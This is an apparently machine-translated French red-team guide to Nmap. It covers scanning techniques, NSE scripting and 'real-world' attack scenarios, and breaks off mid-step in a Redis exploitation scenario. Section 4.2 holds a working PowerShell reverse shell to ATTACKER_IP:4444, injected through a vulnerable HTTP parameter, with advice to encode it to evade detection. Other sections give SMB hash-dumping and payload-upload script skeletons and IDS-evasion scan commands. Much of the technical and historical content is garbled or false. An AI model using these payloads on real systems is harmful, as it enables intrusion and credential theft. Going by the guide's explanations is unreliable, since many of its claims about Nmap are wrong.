# GUIDE COMPLET SUR NMAP POUR LES RED TEAMERS
# De Zéro à Héros

_Daily Red Team Academy_

## Avertissement
Ce livre est destiné uniquement à des fins éducatives et de recherche. L'utilisation non autorisée de systèmes sans permission explicite est illégale. Effectuez toujours des tests dans un environnement contrôlé et légal.

© Copyright 2025 par Daily Red Team – Tous droits réservés

## INTRODUCTION

Nmap est un puissant outil de scan réseau qui peut être utilisé pour identifier des hôtes et des services dans un réseau. C'est un outil flexible qui permet non seulement d'identifier des hôtes et des services, mais aussi de valider la sécurité d'un réseau. Tout au long de cette série, nous apprendrons comment utiliser Nmap dans les opérations de red teaming. Dans ce premier guide, nous aborderons le fonctionnement de Nmap, différents paramètres d'exécution et différentes techniques de scan.

Pourquoi étudier Nmap ? Nmap est une application fréquemment utilisée dans la vie d'un red teamer. Il est responsable du scan des réseaux pour identifier les hôtes et les services ; de la même façon, il peut être utilisé pour trouver des informations liées à la sécurité concernant le réseau. Les red teamers, en particulier, sont plus attirés par Nmap en raison de ses puissantes capacités de scan furtif.

Nous examinerons en détail les options en ligne de commande de Nmap, comment effectuer différents types de scans, et un peu de théorie sur les différentes technologies de scan disponibles. Qu'est-ce que Nmap ? Nmap est un puissant outil de scan réseau qui peut être utilisé pour explorer les ordinateurs et les services dans un réseau informatique. C'est l'un des utilitaires les plus puissants pour scanner un réseau et peut être utilisé pour une grande variété de tâches, comme comprendre la topologie du réseau, découvrir les hôtes et services disponibles, et identifier les systèmes d'exploitation des appareils en fonctionnement.

Nmap est un scanner réseau bien connu et haute performance disponible sur de nombreuses plateformes différentes, comme Windows, Unix, BSD et Linux. Comme Nmap est open source et gratuit, il est facilement accessible et peut être installé très rapidement sur un système.

## 1.1 QU'EST-CE QUE NMAP ?

Nmap (Network Mapper) est un scanner de sécurité. Il est utilisé pour découvrir des hôtes et des services sur un réseau informatique, créant ainsi une "carte" du réseau. Pour atteindre son objectif, Nmap envoie des paquets spécialement conçus à l'hôte cible puis analyse les réponses. Nmap a également la capacité de ping un seul hôte ou une plage d'adresses IP, d'effectuer une résolution DNS inverse, de découvrir des appareils (et des hôtes) sur le même réseau ou sur d'autres réseaux connectés en utilisant différentes techniques, et de nombreuses autres tâches de réseau avancées tout en restant à bas niveau et puissant.

Nmap fonctionne sur divers systèmes d'exploitation. L'outil en ligne de commande dans les systèmes d'exploitation de type Unix s'appelle simplement Nmap ; vous pouvez l'exécuter simplement en tapant nmap. L'interface graphique s'appelle Zenmap ; vous pouvez y accéder en tapant zenmap dans le terminal.

La base de Nmap est les paquets IP bruts qu'il envoie. L'élément central de Nmap est la capacité à déterminer la disponibilité des hôtes sur un réseau et à découvrir quels services ces hôtes offrent. Ces services sont identifiés en faisant des sondes contextuelles de plus en plus profondes dans un service, normalement HTTP, SSH, SMB, et plus, en créant des paquets, en étudiant les réponses, puis en interprétant les résultats pour établir le statut de la cible. Nmap est utilisé pour découvrir des hôtes et des services sur un réseau informatique en envoyant des paquets et en analysant les réponses.

Nmap offre un certain nombre de fonctionnalités pour sonder les réseaux informatiques, notamment la découverte d'hôtes et la détection de services et de systèmes d'exploitation. Ces fonctionnalités sont extensibles par des scripts qui fournissent une détection de service plus avancée, une détection de vulnérabilités et d'autres fonctionnalités. Nmap offre un riche ensemble de fonctionnalités, notamment des contournements de pare-feu, la saturation DNS et l'empreinte digitale des points de terminaison de service.

Nmap implémente une variété de modèles de scan, dont le plus courant est un scan de connexion TCP. Nmap adhère à la norme Minimum Time to Live, qui stipule que Nmap n'envoie que des paquets qui sont censés survivre aux cibles les plus proches. Nmap est utilisé pour explorer furtivement les réseaux informatiques et analyser les services réseau afin d'obtenir des informations pour des tâches de sécurité. L'utilisation de Nmap pour effectuer des tâches de sécurité sans l'autorisation du propriétaire du réseau informatique est illégale dans plusieurs juridictions. En conséquence, plusieurs outils d'audit ont émergé pour s'assurer qu'aucune loi n'a été enfreinte. Ces programmes sont libres et open-source et peuvent être utilisés pour assurer la sécurité.

Nmap est assez puissant et peut effectuer beaucoup de fonctions :
* La découverte d'hôtes inclut les hôtes actifs sur le réseau, la résolution DNS inverse, l'adresse MAC, le fournisseur MAC et le fournisseur MAC avec compteur.
* La recherche de ports qui implique l'état des ports sur le système (ouverts ou fermés).
* La découverte de systèmes d'exploitation, qui inclut les types de systèmes d'exploitation et les détails des systèmes d'exploitation fonctionnant sur les hôtes.
* Le timing et les charges utiles qui impliquent des techniques pour contrôler les informations de timing de la phase de scan et les charges utiles utilisées.
* Les améliorations de sortie impliquent des techniques pour améliorer la sortie en montrant les paquets, les scripts et le débogage.
* Les tâches spéciales impliquant des techniques et des tâches de scan avancées, y compris le scan ARP, le firewalk, la fragmentation, le scan inactif, le scan de protocole IP, la résolution de noms, la sélection de port source et le moteur de script.
* Les variables de profil pour l'amélioration des performances.
* Les tâches diverses, y compris des options supplémentaires qui peuvent ajouter de la verbosité à la conception du scan et à la définition du profil.
* L'analyse comparative qui répertorie les différences entre la version Nmap préexistante.
* Les techniques ResoNmap telles que les scripts NSE utilisés, le filtrage d'hôtes, les protocoles, la réponse ping, le scan à distance et les détails de découverte.

## 1.2 HISTOIRE ET DÉVELOPPEMENT

Nmap a été initialement conçu à la fin des années 1990, et le développement a commencé vers 1995. En discutant de la façon dont Nmap est venu à exister, il a été noté qu'il y avait de la frustration lors de la tentative de découvrir l'adresse IP d'une imprimante réseau à partir d'un travail d'impression échoué. Il y avait un désir d'avoir un outil qui permettrait facilement aux utilisateurs de le faire, et donc la première version intégrait toutes les fonctionnalités jugées utiles. La construction originale a également été influencée par un outil déjà existant appelé "Strobe".

Le nom Nmap est dérivé de son architecture client-serveur originale. Network Mapper ; dans ce contexte, le mot "mapper" ne doit pas être confondu avec la fonction de "mapping" d'autres mappeurs de réseau, mais le mappage complet N+1 du réseau et du client.

Après la transformation de l'architecture client-serveur en architecture interne, un certain nombre de rétronymes, tels que "Network Mapped", "Network Mapping", etc., ont été envisagés, mais rien ne semblait mieux que le nom original. Les fonctionnalités de la version initiale de Nmap consistaient à "Trouver des systèmes actifs et des ports ouverts", "Détection de système d'exploitation basée sur la correspondance de scan simple" et "Scan SYN TCP, scan de connexion TCP, acquisition de bannière FTP et Telnet". Après la sortie de Nmap 2.0, la communauté de sécurité réseau a commencé à tester l'outil sur leurs réseaux et a signalé des bugs, demandé des fonctionnalités et généralement essayé de forcer l'outil à faire des choses pour lesquelles il n'était pas conçu. Après un certain nombre d'itérations, Nmap v2.10B2 a été publié en 1997.

Cette même année, en novembre, Nmap a fait la couverture d'un magazine. À partir de v2.11, Nmap était développé pour ne corriger que les bugs et rétroporter les fonctionnalités vers la série. En 1999, Nmap v2.50 avec une interface graphique a été publié, ouvrant ainsi la possibilité de l'exécuter sur un Mac.

## 2. TECHNIQUES DE SCAN

Nous ne pouvons pas directement comparer les techniques de scan. Toutes les techniques de scan ont leurs propres avantages et inconvénients. Si vous sélectionnez une technique particulière, vous pourriez en bénéficier, mais la même technique pourrait ne pas fonctionner efficacement ou selon les attentes pour une autre personne ou à un autre moment. Combiner l'utilisation intelligente des techniques de scan est la principale compétence d'un maître de Nmap. Un utilisateur régulier ou débutant suit normalement une technique de scan particulière étape par étape sans connaître la raison exacte derrière celle-ci. Avec l'expérience et une compréhension approfondie des technologies, on peut mieux comprendre toutes les techniques de scan et peut atteindre le résultat souhaité efficacement. Ci-dessous sont les techniques courantes qui sont utilisées dans Nmap.

### 2.1. DÉCOUVERTE D'HÔTES

La première étape de la découverte d'hôtes consiste à rechercher des hôtes actifs en envoyant une requête d'écho ICMP. Si un routeur est sur le chemin et que le système d'exploitation de la cible peut gérer le trafic, une réponse d'écho ICMP de la cible révélera son existence. Ce trafic, avec un horodatage, vous donne une idée du temps d'aller-retour entre la source et la cible. L'examen de ce trafic vous donnera également une indication du type de systèmes d'exploitation que la cible peut détecter et comment son comportement pourrait changer en présence de ce trafic. C'est une forme passive de découverte d'hôtes car seul le chemin du routeur a changé. L'expéditeur est complètement invisible pour les cibles. Du côté positif, il n'y a pas d'impact significatif sur les cibles. Une sonde ICMP qui ne reçoit pas de réponse pourrait indiquer un pare-feu qui supprime les paquets ICMP ou un hôte qui est mal configuré pour supprimer l'ICMP.

Présence de trafic : Une technique de découverte d'hôtes combinant à la fois des formes 'actives' et 'passives' détermine si l'hôte cible existe. Une adresse usurpée est injectée dans le réseau, et une requête ARP est faite pour cette source. Si plusieurs requêtes ping ICMP sont faites à partir de la même source, elles sont très probablement toutes répondues par le même système cible en fonction des temps d'aller-retour. Encore une fois, cette méthode peut également vous donner une idée du type de cibles qui sont présentes.

### 2.2. TECHNIQUES DE SCAN DE PORT

#### 2.2.1. Scan Connect
Le scan de connexion a toujours été la façon la plus fiable et stable de scanner tout l'Internet. Les entreprises qui effectuent des scans de port de leurs serveurs utilisent principalement le scan de connexion et scannent également un serveur chaud. C'est un scan complet de poignée de main en trois étapes.
* Avantages : Scan de Connexion Complète Quasi-Furtif Résultats Quasiment Fiables Scanne les serveurs chauds sans les faire planter Fiable Stable
* Inconvénients : Sur un réseau rapide, il peut être lent.

#### 2.2.2. Scan Furtif
Une des autres méthodes de scan populaires est le Scan Furtif. Il y a deux types de scan qui sont étiquetés furtifs : SYN et FIN. Le scan SYN est également connu comme le scan semi-ouvert parce que vous ne vous embêtez pas à gaspiller des ressources pour compléter la poignée de main TCP en trois étapes complète.
* Avantages : Les scans SYN furtifs sont utiles pour l'usurpation ARP et les MITM.
* Inconvénients : Tendance à faire planter les serveurs chauds.

#### 2.2.3. Scan Null/FIN/Xmas
Il existe des scans spéciaux pour d'autres drapeaux comme NULL, FIN et XMAS. NULL et XMAS sont similaires aux scans FIN et SYN, mais NULL est différent des autres. En quoi NULL et XMAS sont-ils différents des autres ? Ils sont différents en ce qu'ils ne définissent pas un seul drapeau TCP. Comme aucun drapeau TCP distant n'est défini, le comportement par défaut est différent de la façon dont la plupart des services et systèmes d'exploitation réagiront aux paquets envoyant un drapeau RST. Lorsqu'un port de destination est ouvert, le drapeau RST est retourné.

### 2.3. DÉTECTION DE SERVICE ET DE VERSION

La détection de service et de version n'est pas seulement une fonction de base de Nmap mais aussi une fonction qui est souvent utilisée. Le drapeau pour cette fonction est "-sV". L'exécution de cette fonction nous donnera des informations détaillées sur l'application cible, facilitant notre reconnaissance. La raison pour laquelle nous pouvons effectuer si facilement la détection de service et de version en utilisant Nmap est que la plupart des services à attaquer utilisent des ports par défaut fixes.

Par exemple, un serveur web fonctionne sur le port 80, un service SSH fonctionne sur le port 22, et un service DNS fonctionne sur le port 53. Comme la plupart des services utilisent des ports par défaut fixes, les vérifier un par un est une manière très simple de découvrir quels services sont en fonctionnement. Connaître la version du service est important dans la mesure où cela peut être un facteur crucial dans l'efficacité de notre attaque. Différentes versions d'un service particulier hébergent différentes vulnérabilités.

## 3. UTILISATION AVANCÉE DE NMAP

Dans ce chapitre, vous serez initié aux scans Nmap avancés et à la façon dont ils peuvent être utilisés pour détecter les configurations et versions de service, définir des topologies réseau et identifier divers problèmes de sécurité. Comme Nmap peut être utilisé pour sonder les systèmes à la recherche de vulnérabilités et de mauvaises configurations de sécurité, il est important de comprendre comment Nmap fonctionne en coulisses et comment Nmap peut être détecté et contré. Quelques commandes Nmap supplémentaires seront présentées à la fin du chapitre. Cela vous permettra de convertir facilement la sortie, ce qui économisera une quantité significative de temps.

En dehors de cela, nous passerons également en revue le scan interactif, l'utilisation de différentes conditions d'alerte fournies par Nmap lors de l'écriture de scripts personnalisés, ainsi que leur développement. Nous terminerons ce chapitre en couvrant différentes façons de filtrer le trafic Nmap pour éviter les détections imparfaites et, dernier point mais non le moindre, intensifier les scans en cours.

Dans ce chapitre, vous apprendrez à écrire des scripts personnalisés et à les développer. Vous recevrez un bon point de départ pour comprendre le Moteur de Script Nmap et comment il est utilisé. On vous montrera également comment écrire des scripts simples, utiliser des conditions d'alerte, et la sortie et l'utilisation de la bibliothèque d'événements. Nous terminerons ce chapitre avec des fonctionnalités supplémentaires, telles que la détection de version de service et toutes les sondes de service. Nous finirons ce guide avec un résumé, couvrant à la fois les techniques de collecte d'informations passives et actives, ainsi que l'amélioration de vos compétences en utilisant des scripts pour développer davantage Nmap. Nous conclurons avec les meilleures pratiques et les listes de contrôle de script.

### 3.1. SCRIPT AVEC NSE (NMAP SCRIPTING ENGINE)

Dans NSE, les scripts sont des programmes concis qui traitent de la gestion des connexions TCP. Le programme lui-même fait partie intégrante de Nmap et gère de grandes parties de l'identification des services et de la détection de force brute. La spécification de NSE utilise un fichier avec diverses fonctions pour accomplir cela. Dans une fonction de fichier particulière, une connexion TCP interactive complète peut être offerte en fonction du script NSE invoqué. Selon la disponibilité des scripts de service NSE, Nmap trouvera et offrira cette interaction de manière autonome. Arguments La sélection et l'administration des scripts sont effectuées en invoquant Nmap. L'option est utilisée pour exécuter des scripts Nmap. Cela analysera le fichier de script spécifié soit à partir du répertoire par défaut, soit celui qui peut être référencé en utilisant un chemin de répertoire. Un groupe de scripts peut également être exécuté en utilisant leur catégorie ou types de fichiers.

Catégories de Scripts
Les scripts Nmap peuvent être catégorisés selon les cinq classes suivantes :
* par défaut : Ce sont des scripts de base.
* auth : Ce sont les scripts pour les fonctions d'authentification.
* broadcast : Ces scripts échangent des données avec les systèmes via une diffusion locale.
* brute : Ces scripts sont utilisés pour cracker divers types de mots de passe.
* discovery : Ces scripts effectuent des tâches de découverte de service contre des systèmes spécifiques.
* vuln : Ces scripts vérifient la vulnérabilité des systèmes ciblés par le scan.

Types de Scripts
Chaque fichier de script est un morceau de logiciel considérablement distinct et est spécialisé pour effectuer quelques tâches de services réseau particuliers. Le script peut consister en plusieurs pièces pour faire face à toutes les variations prévisibles. Chaque script peut identifier une substitution de la description du service sur le système ciblé par le scan. Ces différentes pièces ou types peuvent être compris en vérifiant les métadonnées.

Conseils : N'oubliez pas de vérifier et d'être conscient de la politique d'exécution. Cela restreint l'exécution de tout script Nmap précieux qui met en danger la sécurité d'une application ou d'un système. Une grande partie du script est prise en charge par des drapeaux authentiques par défaut et doit être utilisée prudemment. Faites attention à tout comportement 'faux' pendant l'exécution du script. Officiellement, aucune option simple ne peut être activée, et seules les fonctionnalités autorisées peuvent être utilisées.

### 3.2. FORMATS DE SORTIE ET RAPPORTS

Enfin, rassembler les données nécessaires semble parfois être la partie la plus difficile, mais c'est facile avec les bons drapeaux. Les drapeaux peuvent parfois être suffisants. Cependant, sans certains types de sortie spécifiques et leur formatage, il peut être très difficile de les utiliser ou de les agréger selon les besoins. Voici les formats de sortie les plus courants et quelques conseils pour les utiliser.

Utiliser grep pour trouver certaines informations : après avoir effectué votre scan, vous voudrez peut-être envoyer vos résultats vers un fichier spécifique ou les formater d'une certaine manière. La meilleure façon de faire cela est de le combiner avec grep.

"xml: -oX, --xml"
a XML intégré, un format très utile et puissant utilisé pour une part significative de la conception logicielle. Les paramètres peuvent être ajustés, et la sortie peut être agrégée avec d'autres données pour les besoins de rapports ou de manipulation de données. Il peut être édité et traité à la fois avec des scripts ou depuis la ligne de commande.

La création d'un fichier XML se fait de la même manière en utilisant le drapeau "-oX" puis le nom de fichier ou l'emplacement du fichier nécessaire. Par défaut, cela créera un fichier XML. Si vous souhaitez changer l'emplacement du fichier à un autre, utilisez un signe égal comme indiqué ci-dessous.
"-A -oX"

Après avoir créé un fichier nommé AllPorts.xml, qui contient la sortie brute d'un scan, la sortie brute à l'intérieur du fichier XML peut être utilisée avec grep pour trouver des informations spécifiques. Testons cela avec une simple comparaison entre les bannières telnet et FTP. En utilisant grep et en entrant telnet comme script et AllPorts.xml comme emplacement de fichier, la sortie textuelle utilisable peut être analysée directement à partir du fichier XML. C'est souvent préféré depuis un shell et est utile pour l'agrégation ou simplement pour rassembler des données spécifiques.

### 3.3. OPTIMISATION DES PERFORMANCES

Nmap est écrit en C et utilise principalement des sockets bruts pour construire et envoyer des trames Ethernet brutes. Par conséquent, l'outil est extrêmement rapide. Cependant, il nécessite beaucoup de CPU. Alors que dans un engagement avec des systèmes cibles limités, l'utilisation du CPU est à peine préoccupante. Cependant, cela peut faire une énorme différence lors du scan de nouveaux réseaux avec des milliers de systèmes. Dans un tel cas, il est possible que Nmap prenne des heures voire des jours pour terminer. Il existe plusieurs méthodes pour accélérer le processus de scan.

Scan Multi-thread
C'est probablement la façon la plus facile d'optimiser les performances. Même si cette option n'est normalement pas activée par défaut, Nmap est également capable de scan multi-thread. Grâce à la parallélisation, l'outil peut fonctionner sur plusieurs cœurs de CPU presque linéairement. La commande pour utiliser cette fonctionnalité est bien sûr -T4 avec une plage de 1 à 5.

Spécification de Cible dans des Listes
Une plage en notation CIDR est déjà la façon la plus efficace de spécifier des cibles. La prochaine façon la plus efficace de donner des cibles est alors, bien sûr, des listes en texte brut. La spécification de cible avec des plages est moins optimisée que les plages en notation CIDR, et le moteur d'inférence de Nmap pourrait ignorer certaines de ces spécifications de plage tout en utilisant des plages CIDR à la place. Les listes d'hôtes sont les moins optimisées, donc réduisez vos lignes de commande Nmap en utilisant des spécifications de plage chaque fois que possible.

Si vous travaillez sur un grand réseau, la première étape consiste à réduire la quantité d'informations que le réseau nécessite d'envoyer tout en utilisant la quantité d'informations qu'il accumule avec des spécifications de cible ou des options. Cela signifie combiner des plages en listes dans le plus petit nombre de listes de petits réseaux possible. Lorsque plusieurs grandes listes sont spécifiées, le trafic peut être utilisé moins efficacement. Plus un réseau est grand, plus les administrateurs devraient essayer de se cacher dans la portée de la liste.

Pour ceux qui ne cherchent pas à attirer l'attention sur la structure ou la taille du réseau, des constructions qui peuvent être divisées différemment peuvent être utilisées. Par exemple, un réseau est structuré topographiquement d'une manière qui rend les diffusions excessives impossibles à recevoir, comme de petites chaînes de magasins situées dans des bureaux d'entreprise séparés connectés au même segment de réseau physique. Seuls quelques systèmes peuvent partager un seul segment Ethernet dans cet exemple, il n'y a donc pas de problème de sécurité à les avoir tous présents en termes de nombre d'appareils ou d'exposition de diffusion. En revanche, 2000 appareils de l'ensemble du réseau de l'entreprise ou 300 appareils gouvernementaux dans la même pièce peuvent être une cause de préoccupation, ou du moins un mal de tête pour examiner les réponses subséquentes. Avec ce genre de structure paranoïaque, il est facile de manquer des cibles.

* Réduire le Nombre de Hits : Réduire le nombre de hits peut être une autre méthode d'optimisation des performances. Avec moins de temps d'exposition, Nmap peut augmenter le nombre de scans réseau qu'il peut effectuer sans attirer l'attention. De plus, les administrateurs peuvent accéder à la console de surveillance réseau plus facilement à partir d'un modem à faible profil ou d'un canal radio.

* Throttle : Il peut y avoir des raisons légitimes pour lesquelles scanner sans faire aboyer le réseau peut ne pas toujours être suffisant. La mise en forme du trafic peut également être une mesure raisonnable en ajustant la quantité de trafic produite par le scanner. Cela donne à l'administrateur le temps de recevoir des notifications ou une relative tranquillité d'esprit sachant que l'enfant exilé a cessé d'embêter les voisins. L'option –max-rate définit le nombre maximum de paquets que Nmap scanne par seconde, tandis que l'option –min-rate fournit la date pour le taux minimum. En essence, l'option –min-rate fait simplement durer les scans plus longtemps en les espacant.

* Modes de Scan Minimum : Si des scans dormants sont nécessaires, essayez d'utiliser le mode de scan le plus efficace. Cela signifie exclure les réponses ou le taux, et utiliser l'ordre de scan en parallèle. Gardez également à l'esprit que Nmap ralentit pour permettre aux réponses d'être affichées. Les options –min-parallelism, –max-rtt-timeout et –max-retries peuvent être utilisées pour gérer ces réponses, très similaires à l'option –min-parallelism demandée par défaut.

## 4. NMAP POUR LE RED TEAMING

Au cours du processus de reconnaissance, un professionnel de la sécurité offensive utilise de nombreux outils pour rassembler le maximum de détails sur le renseignement. Généralement, Nmap est le premier outil que tout professionnel de la reconnaissance envisagerait d'utiliser. Nmap est assez simple à utiliser et contient divers types d'options de scan pratiques où vous pouvez modifier les scripts selon les exigences de reconnaissance. Il est extrêmement fiable et est toujours considéré comme un outil fiable lors de l'exécution de n'importe quel scan. En tant que Red Teamers, nous devrions commencer à nous concentrer sur l'utilisation, le réglage et la personnalisation des scripts de Nmap.

Vous pouvez certainement exécuter un scan en utilisant l'option de commande simple de Nmap, mais pourquoi rester simple si la complexité est ce que nous embrassons le plus ? En tant que Red Teamers, utilisez autant que possible les ensembles de fonctionnalités de Nmap. Les exigences du Red Teaming sont légèrement différentes du scan réseau conventionnel, car nous devons rester un peu sous couverture tout en évitant les IDPS et EDPS existants. Être furtif est important pour les professionnels de la sécurité offensive. En même temps, les outils se mouleront en fonction des exigences et de l'utilisation de l'utilisateur ; il est préférable de savoir ce qu'il fait et de quoi il est capable ! La confiance en Nmap est plus vitale et est largement considérée lors de l'exécution d'un scan. Nmap est un outil robuste, mais l'utilisateur joue un rôle pivot dans les résultats et les informations, pas l'inverse. Assurez-vous de tirer parti efficacement des options clés en utilisant la syntaxe de commande Nmap. Protégez-vous et, en même temps, restez furtif. Gardez toujours l'OpSec à l'esprit !

### 4.1. OSINT ET RECONNAISSANCE

Pendant la reconnaissance, les acteurs de menace et les défenseurs rassemblent des informations pour définir leurs stratégies. En termes de performance, ce processus n'est pas très efficace pour l'une ou l'autre partie car plusieurs éléments de renseignement sont souvent extraits, et les stratégies des adversaires sont rapidement ajustées en fonction de ces nouvelles découvertes. La détection d'actifs, la découverte de vulnérabilités ou l'empreinte digitale d'un réseau spécifique mène à l'exposition d'acteurs de menace non sophistiqués qui effectuent manuellement ces activités. Ce problème n'atteint un certain niveau de difficulté que si les défenseurs ont une grande zone à couvrir et ne sont pas conscients de ce qu'ils protègent. Cependant, si ce processus est correctement effectué, et qu'une grande quantité de nouvelles données peut être révélée et même documentée avec un niveau d'effort élevé, même des attaquants avancés qui collectent d'énormes quantités de renseignements peuvent être observés. Un outil bien connu dans ce domaine fournit un grand nombre de drapeaux. Dans cette section, ces drapeaux et leurs ajustements seront discutés avec une variété d'exemples. Assurément, les drapeaux doivent être utilisés avec un certain degré de prudence tout en s'efforçant de maintenir le cadre éthique et les lois pour éviter de faire face à toute situation indésirable.

Les commandes suivantes incluent une description des sorties ainsi que plusieurs éléments d'intuition technique; une intuition plus profonde est fournie pour chaque commande. Pour éviter de faire face à des problèmes importants, le scan de réseaux étrangers doit être considéré comme hautement contraire à l'éthique et doit être légalement autorisé. La disponibilité des commandes dans un outil spécifique n'est pas requise, car cela dépend des installations précédentes de l'utilisateur; une machine virtuelle et une commande sont requises par l'édition communautaire.

### 4.2. TECHNIQUES D'EXPLOITATION ET DE POST-EXPLOITATION

Nmap n'est pas simplement un outil de reconnaissance; son extensibilité par scripts et son intégration avec des frameworks modernes en font un atout polyvalent pour les red teamers pendant les phases d'exploitation et de post-exploitation. Cette section plonge dans des techniques avancées exploitant les moteurs de script de Nmap, le support de protocole et les capacités d'exécution de code personnalisé pour réaliser une exploitation précise et maintenir la persistance.

#### 4.2.1. EXPLOITATION DE SCRIPT POWERSHELL INTÉGRÉ VIA DES VULNÉRABILITÉS DE SERVICE

Alors que l'option -p de Nmap spécifie les ports, son moteur de script (NSE) permet l'exploitation de services vulnérables à l'injection de commandes. En créant des scripts NSE, les red teamers peuvent intégrer des charges utiles PowerShell pour exécuter du code arbitraire sur des cibles Windows. Par exemple, exploiter un serveur web vulnérable à l'injection de commandes (par exemple, via le sabotage de paramètres HTTP) pourrait impliquer l'injection d'un shell inversé PowerShell.

Exemple de Squelette de Script NSE:
```
description = "Injecte un shell inversé PowerShell via un paramètre vulnérable"
author = "Red Team"
categories = {"exploit"}
portrule = function(host, port)
    return port.protocol == "tcp" and port.number == 80
end
action = function(host, port)
    local cmd = "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);
$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
    local path = "/vulnerable-endpoint?param=" .. os.getenv("URL_ENCODE")(cmd)
    local response = http.get(host, port, path)
    return "Payload injecté via injection de commande"
end
```

Utilisation:
* Remplacez ATTACKER_IP par l'IP de votre serveur C2.
* Exécutez avec:
`nmap -p 80 --script http-vuln-powershell-inject <target>`

Considérations clés:
* Le service cible doit permettre l'exécution de commandes non validées.
* Utilisez l'encodage (par exemple, Base64, URL) pour évader la détection.

#### 4.2.2. EXPLOITATION NATIVE DU MOTEUR DE SCRIPT NMAP (NSE)

Les scripts pré-construits et personnalisés de NSE automatisent l'exploitation de vulnérabilités connues. Les red teamers peuvent exploiter les catégories de script vuln et exploit pour des tâches comme le dumping d'identifiants, RCE et le mouvement latéral.

Scripts d'Exploitation Communs:
* smb-vuln-ms17-010: Exploite la vulnérabilité EternalBlue.
* http-vuln-cve2021-44228: Détection RCE de Log4Shell.
* ssh-brute: Force brute d'identifiants.

Exemple de Script Personnalisé (Dumping d'Identifiants SMB):
```
description = "Extrait les hachages SMB via un accès anonyme"
author = "Red Team"
categories = {"exploit"}
portrule = function(host, port)
    return port.number == 445 and port.protocol == "tcp"
end
action = function(host, port)
    local smb = require "smb"
    local status, result = smb.get_shares(host)
    if status then
        smb.share_dump(host, "IPC$") -- Dump du partage IPC$ pour les hachages
        return "Hachages SMB extraits"
    end
end
```

Utilisation:
`nmap -p 445 --script smb-harvest <target>`

#### 4.2.3. SCRIPT LUA POUR DES EXPLOITS SPÉCIFIQUES AU PROTOCOLE

Le moteur Lua de Nmap permet un contrôle granulaire sur les interactions réseau. Les red teamers peuvent créer des exploits spécifiques au protocole (par exemple, HTTP, SMB, DNS) en utilisant la bibliothèque socket de bas niveau de Lua.

Exemple: Requête HTTP POST avec Charge Utile Malveillante:
```
local http = require "http"
local io = require "io"

prerule = function()
    -- Logique pré-scan
end
action = function(host, port)
    local payload = io.open("exploit.bin", "rb"):read("*a")
    local response = http.post(host, port, "/upload", {header={["Content-Type"]="application/octet-stream"}, body=payload})
    if response.status == 200 then
        return "Charge utile d'exploit livrée"
    end
end
```

#### 4.2.4. SUPPORT DE PROTOCOLE ACTIVÉ PAR LUA

Les scripts Lua de Nmap supportent de nombreux protocoles, permettant aux red teamers d'interagir avec des services comme:
* SMB: Énumération de partages, dumping de hachages.
* HTTP/HTTPS: Exploitation web, interaction API.
* DNS: Force brute de sous-domaine, transferts de zone.
* SSL/TLS: Exploitation Heartbleed, déclassements de chiffrement.

Bibliothèques Spécifiques au Protocole:
* smb = require "smb"
* http = require "http"
* dns = require "dns"

#### 4.2.5. SYNTAXE ET STRUCTURE DE SCRIPT LUA

Les scripts Nmap suivent un format structuré:
```
-- Métadonnées
description = "Exploit personnalisé"
author = "Red Team"
license = "Identique à Nmap"
categories = {"exploit", "vuln"}

-- Logique de détection hôte/port
portrule = function(host, port)
    return port.protocol == "tcp" and port.number == 443
end

-- Logique d'exploit
action = function(host, port)
    local vuln = {title = "CVE-2023-0000", state = vulns.STATE.EXPLOIT}
    local exploit = http.post(host, port, "/api/exploit", {body = "malicious_data"})
    if exploit.status == 200 then
        vuln.state = vulns.STATE.EXPLOITED
    end
    return vuln_report:make_output(vuln)
end
```

#### 4.2.6. CHARGEMENT DE SCRIPTS LUA PERSONNALISÉS

Pour charger des scripts Lua personnalisés:
1. Sauvegardez le script dans ~/.nmap/scripts/.
2. Mettez à jour la base de données de scripts de Nmap:
   `nmap --script-updatedb`
3. Exécutez avec:
   `nmap -p 443 --script custom-exploit <target>`

Dépannage:
* Utilisez -d pour la sortie de débogage.
* Assurez-vous que le shebang du script inclut le chemin Lua de nmap:
  `#!/usr/bin/env nmap --script`

## 5. SCÉNARIOS DU MONDE RÉEL POUR LES RED TEAMERS UTILISANT NMAP

La flexibilité de Nmap le rend indispensable pour les opérations de red teaming, de la reconnaissance initiale à la persistance post-exploitation. Ce chapitre explore des scénarios pratiques à fort impact où Nmap brille dans les engagements du monde réel, complets avec des flux de travail techniques, des tactiques d'évasion et du savoir-faire opérationnel.

### 5.1 SCÉNARIO 1: CARTOGRAPHIE RÉSEAU FURTIVE DANS UN ENVIRONNEMENT RESTREINT

Objectif: Cartographier un réseau d'entreprise segmenté protégé par des pare-feu, IDS et un filtrage d'égress strict.

Défi:
* Tout le trafic non-SSH est bloqué.
* Les hôtes ignorent les sondes non sollicitées (par exemple, TCP SYN vers des ports fermés).

Approche Technique:
1. Contournement du Filtrage d'Égress avec des Sondes Leurres:
   Utilisez -D (IPs leurres) et des paquets fragmentés pour masquer l'origine des scans.
   `nmap -sS -D RND:10,192.168.1.100ME -f -T2 -p22,80,443 10.10.0.0/24`
   o RND:10 génère 10 IPs leurres aléatoires.
   o 192.168.1.100ME inclut l'IP réelle de l'attaquant (masquée parmi les leurres).

2. Empreinte Digitale de Service SSH:
   Utilisez ssh2-enum-algos pour identifier les algorithmes de chiffrement faibles:
   `nmap -p22 --script ssh2-enum-algos <target>`
   o Recherchez les chiffrements dépréciés (par exemple, arcfour, 3des-cbc) pour la planification d'exploit.

Point Clé:
* Combinez la fragmentation (-f) avec les contrôles de timing (-T2) pour évader les IDS basés sur l'heuristique.

### 5.2 SCÉNARIO 2: EXPLOITATION D'INSTANCES REDIS MAL CONFIGURÉES

Objectif: Obtenir un accès initial via un serveur Redis exposé sur Internet avec des identifiants par défaut/aucun.

Défi:
* Redis fonctionne sur le port 6379 avec protected-mode désactivé.

Approche Technique:
1. Identifier les Hôtes Redis Vulnérables:
   `nmap -p6379 --script redis-info <plage_cible>`
   o Recherchez redis_version < 6.0 (pré-ACL) ou config get dir révélant des chemins accessibles en écriture.

2. Charger la Clé SSH pour la Persistance:
   Utilisez l'intégration redis-cli de Nmap pour écrire une clé publique dans authorized_keys:
